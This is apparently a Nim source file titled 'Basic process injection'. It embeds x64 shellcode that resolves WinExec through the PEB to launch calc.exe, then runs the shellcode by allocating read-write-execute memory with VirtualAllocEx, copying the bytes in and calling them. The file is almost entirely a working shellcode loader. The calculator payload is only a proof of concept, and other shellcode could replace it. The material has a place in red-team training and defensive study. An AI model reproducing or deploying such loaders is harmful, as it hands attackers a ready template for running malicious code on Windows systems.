#[ Basic process injection ]#
import winim

var buf: array[595, byte] = [
  byte 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x17, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xE9, 0x2E, 
  0x01, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x58, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x00, 0x01, 
  0x00, 0x00, 0x50, 0xC3, 0x0F, 0x0B, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x53, 0x48, 0x31, 0xDB, 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x1C, 
  0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD8, 0x5B, 0xC3, 0x0F, 0x0B, 0x90, 0x90, 0x90,
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x57, 0x56,
  0x53, 0x48, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x66, 0x81, 0x39, 0x4D, 0x5A, 0x48, 0x63, 
  0x71, 0x3C, 0x0F, 0x85, 0x9F, 0x00, 0x00, 0x00, 0x48, 0x01, 0xCE, 0x48, 0x89, 0xCB, 0x81,
  0x3E, 0x50, 0x45, 0x00, 0x00, 0x0F, 0x85, 0x8D, 0x00, 0x00, 0x00, 0x48, 0x8D, 0xBC, 0x24, 
  0x10, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC6, 0x18, 0xB9, 0x3C, 0x00, 0x00, 0x00, 0x48, 0x89,
  0xD5, 0xF3, 0xA5, 0x48, 0x8D, 0x7C, 0x24, 0x20, 0x48, 0x8D, 0xB4, 0x24, 0x10, 0x01, 0x00, 
  0x00, 0xB9, 0x3C, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x31, 0xF6, 0x48, 0x63, 0x84, 0x24, 0x90,
  0x00, 0x00, 0x00, 0x48, 0x01, 0xD8, 0x48, 0x63, 0x78, 0x20, 0x4C, 0x63, 0x60, 0x1C, 0x4C,
  0x63, 0x68, 0x24, 0x44, 0x8B, 0x70, 0x14, 0x48, 0x01, 0xDF, 0x41, 0x39, 0xF6, 0x7E, 0x3E, 
  0x48, 0x63, 0x0F, 0x48, 0x89, 0xEA, 0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC7,
  0x04, 0x48, 0x01, 0xD9, 0xE8, 0x17, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x56, 0x01, 0x48, 0x85, 
  0xC0, 0x74, 0x05, 0x48, 0x89, 0xD6, 0xEB, 0xD5, 0x48, 0x01, 0xF6, 0x48, 0x01, 0xDE, 0x42,
  0x0F, 0xB7, 0x04, 0x2E, 0x48, 0x8D, 0x04, 0x83, 0x4A, 0x63, 0x04, 0x20, 0x48, 0x01, 0xD8, 
  0xEB, 0x02, 0x31, 0xC0, 0x48, 0x81, 0xC4, 0x00, 0x02, 0x00, 0x00, 0x5B, 0x5E, 0x5F, 0x5D,
  0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
  0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xB8, 0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32,
  0x57, 0x56, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x89, 0x44, 0x24, 0x33, 0x48, 0xB8, 0x57, 
  0x69, 0x6E, 0x45, 0x78, 0x65, 0x63, 0x00, 0x48, 0x89, 0x44, 0x24, 0x22, 0x48, 0xB8, 0x63,
  0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0xC7, 0x44, 0x24, 0x3B, 0x2E, 0x64, 0x6C, 0x6C,
  0xC6, 0x44, 0x24, 0x3F, 0x00, 0x48, 0x89, 0x44, 0x24, 0x2A, 0xC6, 0x44, 0x24, 0x32, 0x00, 
  0xE8, 0xB5, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x70, 0x20, 0x66, 0x83,
  0x7E, 0x48, 0x00, 0x74, 0x1F, 0x48, 0x8B, 0x56, 0x50, 0x48, 0x8D, 0x4C, 0x24, 0x33, 0x41, 
  0xB8, 0x02, 0x00, 0x00, 0x00, 0xE8, 0x62, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x06,
  0x48, 0x8B, 0x4E, 0x20, 0xEB, 0x38, 0x48, 0x8B, 0x1E, 0x48, 0x8D, 0x7C, 0x24, 0x33, 0x48, 
  0x39, 0xDE, 0x74, 0x29, 0x66, 0x83, 0x7B, 0x48, 0x00, 0x74, 0x1D, 0x48, 0x8B, 0x53, 0x50,
  0x41, 0xB8, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF9, 0xE8, 0x31, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xC0, 0x75, 0x06, 0x48, 0x8B, 0x4B, 0x20, 0xEB, 0x07, 0x48, 0x8B, 0x1B, 0xEB, 0xD2, 
  0x31, 0xC9, 0x48, 0x8D, 0x54, 0x24, 0x22, 0xE8, 0x65, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x4C,
  0x24, 0x2A, 0x31, 0xD2, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0x5E, 0x5F, 0xC3, 0x90, 
  0x90, 0x90, 0x90, 0x44, 0x8A, 0x11, 0x45, 0x8D, 0x4A, 0xBF, 0x44, 0x89, 0xD0, 0x41, 0x80,
  0xF9, 0x19, 0x77, 0x04, 0x41, 0x8D, 0x42, 0x20, 0x44, 0x8A, 0x0A, 0x45, 0x8D, 0x59, 0xBF,
  0x41, 0x80, 0xFB, 0x19, 0x77, 0x04, 0x41, 0x83, 0xC1, 0x20, 0x41, 0x38, 0xC1, 0x74, 0x07, 
  0x44, 0x29, 0xC8, 0x0F, 0xB6, 0xC0, 0xC3, 0x45, 0x84, 0xD2, 0x74, 0x08, 0x48, 0xFF, 0xC1,
  0x4C, 0x01, 0xC2, 0xEB, 0xC2, 0x31, 0xC0, 0xC3, 0x90, 0x90
]

proc inject(bufPtr: ptr, size: int): void =
    let tProcess = GetCurrentProcessId()
    var procHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)

    let rPtr = VirtualAllocEx(
        procHandle,
        NULL,
        cast[SIZE_T](size),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    copyMem(rPtr, bufPtr, size)
    let f = cast[proc(){.nimcall.}](rPtr)
    f()

when isMainModule:
    const bufLen = buf.len
    var bufPtr = (cast[ptr array[bufLen, byte]](addr buf[0]))

    inject(bufPtr, bufLen)